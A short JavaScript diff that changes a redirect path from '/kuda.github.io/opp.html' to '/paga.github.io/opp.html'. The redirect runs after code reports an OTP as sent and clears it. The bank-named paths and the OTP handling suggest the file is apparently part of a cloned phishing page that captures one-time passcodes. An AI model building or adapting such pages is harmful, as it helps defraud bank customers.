@@ -45,7 +45,7 @@ document
           console.log("Sent successfully:", response);
           otp = "";
 
-          location.href = "/kuda.github.io/opp.html";
+          location.href = "/paga.github.io/opp.html";
         }
       },
       function (error) {
